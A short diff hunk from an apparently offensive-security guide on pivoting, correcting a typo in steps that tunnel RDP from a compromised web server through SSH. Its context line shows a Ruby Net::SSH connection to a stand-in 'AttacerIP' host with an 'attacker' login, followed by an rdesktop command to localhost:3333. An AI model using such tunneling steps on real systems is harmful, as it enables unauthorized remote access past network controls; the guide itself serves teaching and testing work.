@@ -183,7 +183,7 @@ Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|
 end
 ```
 
-Now SS from the **SSH Server** to **localhost** on the localhost's ssh port then  connect from your localhost to your localhost on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen
+Now SSH from the **SSH Server** to **localhost** on the localhost's ssh port then  connect from your localhost to your localhost on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen
 
 ```
 rdesktop localhost:3333
